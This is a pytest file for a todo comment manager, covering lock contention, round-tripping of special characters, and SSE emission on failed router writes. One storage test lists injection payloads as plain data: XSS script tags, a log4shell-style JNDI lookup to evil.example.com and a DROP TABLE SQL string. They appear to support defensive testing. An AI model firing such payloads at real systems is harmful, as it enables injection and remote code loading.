"""Edge-case tests for the todo comment feature.

Three coverage lanes fill the gap left by ``tests/test_todo_manager.py`` and
``tests/unit/routers/test_todo_api.py``:

  1. **Concurrent access** — ``TodoManager`` is guarded by a
     ``threading.Lock`` (sync, not asyncio). Real threads with
     ``ThreadPoolExecutor`` exercise the lock under contention; we
     verify no item is corrupted and no item is silently dropped.

  2. **Special characters in comments** — comments are stored as opaque
     strings and never interpreted as code. Newlines, tabs, emoji, CJK,
     and HTML/script tags must round-trip byte-for-byte. This is the
     XSS-safety contract: *data* is data, never *code* — there is no
     parser in the storage path that could mistake ``<script>`` for an
     executable tag.

  3. **SSE router emission edge cases** — the router emits
     ``stream_todo_update`` AFTER a successful ``set_comment``. The
     existing positive-path tests cover the happy case; the negative
     paths (400 over-length, 404 bad index, 404 bad instance) must NOT
     emit, so the frontend never receives a phantom re-render for a
     failed write.

No DB, no asyncio for the manager tests. Router tests use FastAPI
``TestClient`` mirroring ``tests/unit/routers/test_todo_api.py``.
"""

from __future__ import annotations

import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from unittest.mock import AsyncMock, MagicMock

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from daemon.services.todo_manager import TodoManager


# =============================================================================
# 1. Concurrent access
# =============================================================================


class TestConcurrentSetComment:
    """Concurrent ``set_comment`` + ``update`` + ``get_all`` against one manager.

    The manager serializes everything through a single ``threading.Lock``.
    These tests put real contention on the lock to prove no item is
    silently corrupted or dropped. Each scenario writes many times, then
    reads back to verify state is consistent.
    """

    def test_many_threads_set_comment_on_distinct_indices(self):
        """Each thread writes to its own index — every write must land.

        Workers iterate through ``N`` items and each thread owns one
        item. After all workers join, every item must hold the value
        written by its owner (last-write wins per item, but no item
        may be missing or hold another thread's value).
        """
        mgr = TodoManager()
        n_items = 50
        items = [f"item-{i}" for i in range(n_items)]
        mgr.create("inst-1", items)

        def writer(idx: int) -> None:
            mgr.set_comment("inst-1", idx, f"by-thread-{idx}")

        with ThreadPoolExecutor(max_workers=16) as pool:
            futures = [pool.submit(writer, i) for i in range(n_items)]
            for f in as_completed(futures):
                # Surface any unexpected exception as a test failure.
                f.result()

        state = mgr.get_all("inst-1")
        assert len(state) == n_items
        for i in range(n_items):
            assert state[i]["comment"] == f"by-thread-{i}", (
                f"item {i} got {state[i]['comment']!r}, expected 'by-thread-{i}'"
            )

    def test_many_threads_set_comment_on_same_index_last_write_wins(self):
        """All threads hammer the same index — final value is one writer's value.

        Lock guarantees atomicity (no torn writes); outcome is
        non-deterministic w.r.t. which thread "wins" but the final
        state must be one of the values that was attempted, and
        ``get_all`` must observe a single, consistent string per item.

        Coordination: an ``Event`` released by the main thread unblocks
        all workers simultaneously. We can't use a ``Barrier`` sized
        to ``n_writers`` because the pool only runs ``max_workers``
        concurrently; a mismatched Barrier would deadlock.
        """
        mgr = TodoManager()
        mgr.create("inst-1", ["only"])
        n_writers = 200
        max_workers = 32
        candidate = [f"value-{i}" for i in range(n_writers)]

        gate = threading.Event()

        def writer(val: str) -> str:
            gate.wait()  # All workers released simultaneously for max contention.
            mgr.set_comment("inst-1", 0, val)
            return val

        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            futures = [pool.submit(writer, v) for v in candidate]
            # Release all blocked workers simultaneously for max contention.
            gate.set()
            attempted = [f.result() for f in as_completed(futures)]

        final_comment = mgr.get_all("inst-1")[0]["comment"]
        # Must be exactly one of the values that was attempted (no torn write).
        assert final_comment in attempted
        # And the type must be a clean string — never a partially-overwritten buffer.
        assert isinstance(final_comment, str)
        assert final_comment.startswith("value-")

    def test_concurrent_set_comment_and_update_keep_state_consistent(self):
        """Writers (set_comment) and status-mutators (update) interleave safely.

        Half the threads call ``set_comment`` to set comments, the
        other half call ``update`` to flip status. After both pools
        finish, every item must be in a valid combination of
        ``(status, comment)`` — no comment on an item that doesn't
        exist, no status that the manager doesn't recognise.
        """
        mgr = TodoManager()
        mgr.create("inst-1", [f"task-{i}" for i in range(30)])
        valid_statuses = {"pending", "in_progress", "done"}

        n_comment_writers = 100
        n_status_writers = 100

        def comment_writer(i: int) -> None:
            # Cycle through the 30 items, overwriting comments repeatedly.
            mgr.set_comment("inst-1", i % 30, f"comment-{i}")

        def status_writer(i: int) -> None:
            status = ("done", "in_progress", "pending")[i % 3]
            mgr.update("inst-1", i % 30, status)

        with ThreadPoolExecutor(max_workers=16) as pool:
            futures = []
            for i in range(n_comment_writers):
                futures.append(pool.submit(comment_writer, i))
            for i in range(n_status_writers):
                futures.append(pool.submit(status_writer, i))
            for f in as_completed(futures):
                f.result()

        state = mgr.get_all("inst-1")
        assert len(state) == 30
        for item in state:
            # Every item is in a valid state combination.
            assert item["status"] in valid_statuses
            assert isinstance(item["text"], str) and item["text"].startswith("task-")
            assert isinstance(item["comment"], str)
            # Comment is one of the writers' values (or empty if never written).
            assert item["comment"] == "" or item["comment"].startswith("comment-")

    def test_concurrent_get_all_never_raises_and_returns_full_list(self):
        """Concurrent readers during writes must see consistent snapshots.

        ``get_all`` copies items via ``_to_dict`` under the lock, so a
        caller reading while writes happen must always get a list of
        the same length, with no torn dicts (every key present, every
        value of the right type).
        """
        mgr = TodoManager()
        mgr.create("inst-1", [f"x-{i}" for i in range(20)])

        errors: list[BaseException] = []

        def reader() -> None:
            try:
                for _ in range(100):
                    snapshot = mgr.get_all("inst-1")
                    assert len(snapshot) == 20
                    for item in snapshot:
                        # Every key present, every value typed correctly.
                        assert set(item.keys()) == {"index", "text", "status", "comment"}
                        assert isinstance(item["text"], str)
                        assert isinstance(item["comment"], str)
                        assert item["status"] in {"pending", "in_progress", "done"}
            except BaseException as e:  # noqa: BLE001
                errors.append(e)

        def writer() -> None:
            try:
                for i in range(100):
                    mgr.set_comment("inst-1", i % 20, f"write-{i}")
            except BaseException as e:  # noqa: BLE001
                errors.append(e)

        threads = []
        for _ in range(4):
            threads.append(threading.Thread(target=reader))
        for _ in range(2):
            threads.append(threading.Thread(target=writer))

        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"Reader/writer raised during concurrency: {errors}"

    def test_lock_serializes_updates_no_partial_dict_overwrites(self):
        """Stress: alternating writers on one item, readers must never see partial values.

        One thread repeatedly alternates between two short, distinct
        comments (both under ``MAX_COMMENT_LENGTH`` so the writes
        succeed). A second thread reads the same item 2000 times.
        Every observation must be one of the two valid atomic values —
        never a mixed / partial string. If the lock were missing, a
        reader could observe a value that started as one writer's
        payload and ended as the other's.
        """
        mgr = TodoManager()
        mgr.create("inst-1", ["only"])
        # Keep both payloads under MAX_COMMENT_LENGTH (1000 chars).
        marker = "X" * 999
        stop = threading.Event()
        observed_partial: list[bool] = []
        lock = threading.Lock()

        def writer() -> None:
            i = 0
            while not stop.is_set():
                # Alternate between two distinct values to maximise
                # chance of a partial observation by the reader.
                value = marker if (i % 2 == 0) else ""
                mgr.set_comment("inst-1", 0, value)
                i += 1

        def reader() -> None:
            for _ in range(2000):
                comment = mgr.get_all("inst-1")[0]["comment"]
                # Every observation must be one of the two valid
                # atomic values; anything else means the lock
                # didn't serialise the assignment.
                with lock:
                    observed_partial.append(
                        comment != marker and comment != ""
                    )

        w = threading.Thread(target=writer)
        r = threading.Thread(target=reader)
        w.start()
        r.start()
        r.join()
        stop.set()
        w.join()

        # If we saw any value that was neither marker nor empty, the lock is broken.
        assert not any(observed_partial), (
            f"Saw {sum(observed_partial)} partial-corrupt observations across "
            f"{len(observed_partial)} reads — the lock is not atomic."
        )


# =============================================================================
# 2. Special characters in comments
# =============================================================================


class TestSpecialCharactersInComment:
    """Comments must round-trip byte-for-byte: no interpretation, no mangling.

    The storage path treats ``comment`` as a plain string. There is no
    HTML parser, no Markdown renderer, no template engine. Anything the
    user types (newlines, emoji, CJK, HTML) must be preserved exactly.
    This is the XSS-safety story at the *storage* layer: we never
    execute user input. The frontend is responsible for rendering it
    safely (Angular's default interpolation already escapes), but at
    the storage layer there is no opportunity for injection because
    there is no interpreter.
    """

    def test_newline_characters_preserved(self):
        """LF and CRLF survive storage and retrieval."""
        mgr = TodoManager()
        mgr.create("inst-1", ["A"])

        multiline = "line 1\nline 2\nline 3"
        crlf = "win\r\nline\r\nbreak"
        mgr.set_comment("inst-1", 0, multiline)
        assert mgr.get_all("inst-1")[0]["comment"] == multiline

        mgr.set_comment("inst-1", 0, crlf)
        assert mgr.get_all("inst-1")[0]["comment"] == crlf

    def test_tab_and_whitespace_preserved(self):
        """Tabs, leading/trailing spaces, and mixed whitespace survive."""
        mgr = TodoManager()
        mgr.create("inst-1", ["A"])

        with_tabs = "col1\tcol2\tcol3"
        padded = "   leading and trailing   "
        mixed = "a\tb  c\nd\te"

        for value in (with_tabs, padded, mixed):
            mgr.set_comment("inst-1", 0, value)
            assert mgr.get_all("inst-1")[0]["comment"] == value

    def test_emoji_preserved(self):
        """Multi-byte emoji sequences are stored as-is."""
        mgr = TodoManager()
        mgr.create("inst-1", ["A"])

        # Common emoji + ZWJ sequence + skin tone + flag.
        emoji_comment = "Looks good 👍🏼 — ship it! 🚢✨"
        zwj_sequence = "Family: 👨‍👩‍👧‍👦"
        flag = "Region: 🇻🇳"

        for value in (emoji_comment, zwj_sequence, flag):
            mgr.set_comment("inst-1", 0, value)
            assert mgr.get_all("inst-1")[0]["comment"] == value

    def test_cjk_characters_preserved(self):
        """Chinese, Japanese, Korean text round-trips intact."""
        mgr = TodoManager()
        mgr.create("inst-1", ["A"])

        cjk_samples = [
            "请把这个任务标记为完成",         # Simplified Chinese
            "このタスクを完了としてマーク",   # Japanese
            "이 작업을 완료됨으로 표시",      # Korean
            "Mixed: 日本語 + English + 漢字", # Mixed
        ]

        for value in cjk_samples:
            mgr.set_comment("inst-1", 0, value)
            assert mgr.get_all("inst-1")[0]["comment"] == value

    def test_html_and_script_tags_stored_as_plain_text(self):
        """HTML, script tags, and template markers are stored as data, not executed.

        The storage layer has no parser. ``<script>alert(1)</script>``
        is just 26 characters of string. Whether the *frontend* renders
        it safely is a separate concern; at this layer we prove the
        bytes are not modified or stripped.
        """
        mgr = TodoManager()
        mgr.create("inst-1", ["A"])

        payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "{{ angular_template }}",
            "${jndi:ldap://evil.example.com/x}",  # log4shell-style
            "'; DROP TABLE todos; --",            # SQL-injection-shaped
            "<style>body{display:none}</style>",
        ]

        for payload in payloads:
            mgr.set_comment("inst-1", 0, payload)
            stored = mgr.get_all("inst-1")[0]["comment"]
            assert stored == payload, (
                f"Storage mutated payload {payload!r} to {stored!r}"
            )

    def test_control_and_unicode_edge_characters_preserved(self):
        """NULL byte, RTL marks, zero-width joiners are preserved verbatim."""
        mgr = TodoManager()
        mgr.create("inst-1", ["A"])

        edge_cases = [
            "before\x00after",        # NULL byte (Python keeps it in str)
            "rtl: \u202emojor\u202c",  # RLO + PDF
            "zwj: a\u200bb",          # Zero-width space
            "bom: \ufeffstart",       # BOM
        ]

        for value in edge_cases:
            mgr.set_comment("inst-1", 0, value)
            stored = mgr.get_all("inst-1")[0]["comment"]
            assert stored == value

    def test_max_length_with_multibyte_chars_is_counted_in_codepoints(self):
        """The 1000-char cap is enforced on Python ``len()`` (codepoints, not bytes).

        ``len("🎉") == 1`` in Python — emoji is a single codepoint, even
        though its UTF-8 encoding is 4 bytes. The cap matches that
        contract: 1000 codepoints of any kind passes; 1001 does not.
        """
        from daemon.services.todo_manager import MAX_COMMENT_LENGTH

        mgr = TodoManager()
        mgr.create("inst-1", ["A"])

        # 1000 emoji codepoints is exactly at the limit.
        at_limit = "🎉" * MAX_COMMENT_LENGTH
        result = mgr.set_comment("inst-1", 0, at_limit)
        assert result["comment"] == at_limit
        assert len(result["comment"]) == MAX_COMMENT_LENGTH

        # 1001 must raise.
        over_limit = "🎉" * (MAX_COMMENT_LENGTH + 1)
        with pytest.raises(ValueError, match="exceeds maximum length"):
            mgr.set_comment("inst-1", 0, over_limit)
        # The failed write must not have mutated state.
        assert mgr.get_all("inst-1")[0]["comment"] == at_limit

    def test_special_chars_dont_affect_reminder_fences(self):
        """User-supplied chars in a comment don't break the ``---`` fences.

        The reminder format wraps the comment in
        ``User commented:\n---\n{comment}\n---\n{next}``. If the
        comment itself contains ``---``, the fence ordering still
        works (the *last* ``---`` separates the comment from the
        next-reminder). We verify the literal structure survives
        multi-line and ``---``-laden comments.
        """
        mgr = TodoManager()
        mgr.create("inst-1", ["A", "B"])
        tricky_comment = "First line\n---\nSecond line\n---"
        mgr.set_comment("inst-1", 0, tricky_comment)
        result = mgr.update("inst-1", 0, "done")

        assert result is not None
        reminder = result["reminder"]
        # The user comment is intact between the fences.
        assert "User commented:" in reminder
        assert tricky_comment in reminder
        # The next-pending suffix still follows.
        assert "Next:" in reminder
        assert "B" in reminder


# =============================================================================
# 3. SSE emission edge cases at the router boundary
# =============================================================================


def _make_router_manager() -> MagicMock:
    """Build a mock InstanceManager with a real ``TodoManager`` attached.

    Mirrors ``tests/unit/routers/test_todo_api.py`` so the fixture
    shape stays consistent across the suite. ``get_instance`` returns
    a sentinel — set ``has_instance=False`` for the 404 path.
    """
    manager = MagicMock()
    manager._todo_manager = TodoManager()
    manager.is_write_paused = False

    async def _present(instance_id: str):
        return MagicMock(instance_id=instance_id)

    manager.get_instance = _present
    return manager


def _make_missing_manager() -> MagicMock:
    """Manager whose ``get_instance`` raises KeyError — drives the 404 path."""
    manager = MagicMock()
    manager._todo_manager = TodoManager()
    manager.is_write_paused = False

    async def _missing(instance_id: str):
        raise KeyError(instance_id)

    manager.get_instance = _missing
    return manager


@pytest.fixture
def client_with_hub():
    """FastAPI TestClient wired with a manager + a recording live_hub.

    The hub exposes ``stream_todo_update`` as an ``AsyncMock`` so each
    test can assert exactly when the router pings the SSE pipeline.
    Returns ``(client, manager, hub)``.
    """
    from daemon.routers.instances import router

    app = FastAPI()
    app.include_router(router, prefix="/api")
    hub = MagicMock()
    hub.stream_todo_update = AsyncMock()
    manager = _make_router_manager()

    @app.middleware("http")
    async def _inject(request, call_next):
        request.app.state.manager = manager
        request.app.state.live_hub = hub
        return await call_next(request)

    return TestClient(app), manager, hub


@pytest.fixture
def client_with_missing_instance():
    """FastAPI TestClient wired with a manager whose ``get_instance`` raises.

    Used for the 404-instance edge case — the endpoint must reject the
    request before it ever touches the SSE pipeline.
    """
    from daemon.routers.instances import router

    app = FastAPI()
    app.include_router(router, prefix="/api")
    hub = MagicMock()
    hub.stream_todo_update = AsyncMock()
    manager = _make_missing_manager()

    @app.middleware("http")
    async def _inject(request, call_next):
        request.app.state.manager = manager
        request.app.state.live_hub = hub
        return await call_next(request)

    return TestClient(app), manager, hub


class TestRouterSSEOnCommentEdgeCases:
    """Negative-path coverage: SSE must NOT fire when the write fails.

    The existing happy-path tests in ``test_todo_api.py`` verify a
    successful comment write triggers one SSE emit. These tests cover
    the symmetric guarantees:

      * 400 over-length → no emit (the router short-circuits before
        calling ``set_comment``).
      * 404 bad index → no emit (the router catches ``ValueError`` from
        ``set_comment`` and returns 404).
      * 404 bad instance → no emit (``_check_instance_exists`` raises
        before any work happens).

    If any of these emitted, the frontend would receive a phantom
    ``todo_update`` event for a write that never landed.
    """

    def test_no_sse_on_over_length_comment(self, client_with_hub):
        """400 over-length → hub is not awaited (router short-circuits)."""
        client, manager, hub = client_with_hub
        manager._todo_manager.create("inst-1", ["A"])

        from daemon.routers.instances import MAX_COMMENT_LENGTH

        resp = client.post(
            "/api/instances/inst-1/todos/0/comment",
            json={"comment": "x" * (MAX_COMMENT_LENGTH + 1)},
        )

        assert resp.status_code == 400
        # State untouched — no comment stored.
        assert manager._todo_manager.get_all("inst-1")[0]["comment"] == ""
        # And — critically — the SSE pipeline was never notified.
        hub.stream_todo_update.assert_not_awaited()

    def test_no_sse_on_bad_index(self, client_with_hub):
        """404 out-of-range index → no SSE emit."""
        client, manager, hub = client_with_hub
        manager._todo_manager.create("inst-1", ["only-one"])

        resp = client.post(
            "/api/instances/inst-1/todos/99/comment",
            json={"comment": "ghost write"},
        )

        assert resp.status_code == 404
        assert "not found" in resp.json()["detail"]["message"].lower()
        hub.stream_todo_update.assert_not_awaited()

    def test_no_sse_on_negative_index(self, client_with_hub):
        """404 negative index → no SSE emit."""
        client, manager, hub = client_with_hub
        manager._todo_manager.create("inst-1", ["A", "B"])

        resp = client.post(
            "/api/instances/inst-1/todos/-1/comment",
            json={"comment": "negative write"},
        )

        assert resp.status_code == 404
        hub.stream_todo_update.assert_not_awaited()

    def test_no_sse_on_unknown_instance(self, client_with_missing_instance):
        """404 unknown instance → no SSE emit.

        The router's ``_check_instance_exists`` short-circuits before
        any todo mutation or SSE call. We verify both that the SSE
        pipeline stays quiet and that ``_todo_manager`` was never
        consulted.
        """
        client, manager, hub = client_with_missing_instance

        resp = client.post(
            "/api/instances/ghost-inst/todos/0/comment",
            json={"comment": "writes to nothing"},
        )

        assert resp.status_code == 404
        # The 404 came from get_instance, not from set_comment — the
        # underlying todo store must be untouched for the ghost id.
        assert manager._todo_manager.get_all("ghost-inst") == []
        hub.stream_todo_update.assert_not_awaited()

    def test_sse_payload_carries_full_updated_list_with_new_comment(self, client_with_hub):
        """Successful write: SSE payload reflects the new comment value.

        The hub receives the *post-mutation* snapshot, not the prior
        state. The frontend relies on this to render the comment
        immediately without a follow-up GET.
        """
        client, manager, hub = client_with_hub
        manager._todo_manager.create("inst-1", ["alpha", "beta", "gamma"])

        resp = client.post(
            "/api/instances/inst-1/todos/1/comment",
            json={"comment": "needs clarification"},
        )

        assert resp.status_code == 200
        hub.stream_todo_update.assert_awaited_once()
        call = hub.stream_todo_update.await_args
        assert call.args[0] == "inst-1"
        payload = call.args[1]
        assert len(payload) == 3
        # The annotated item is the one that changed.
        assert payload[1]["comment"] == "needs clarification"
        # The other items are unchanged.
        assert payload[0]["comment"] == ""
        assert payload[2]["comment"] == ""
        # Status / text are untouched.
        assert payload[1]["text"] == "beta"
        assert payload[1]["status"] == "pending"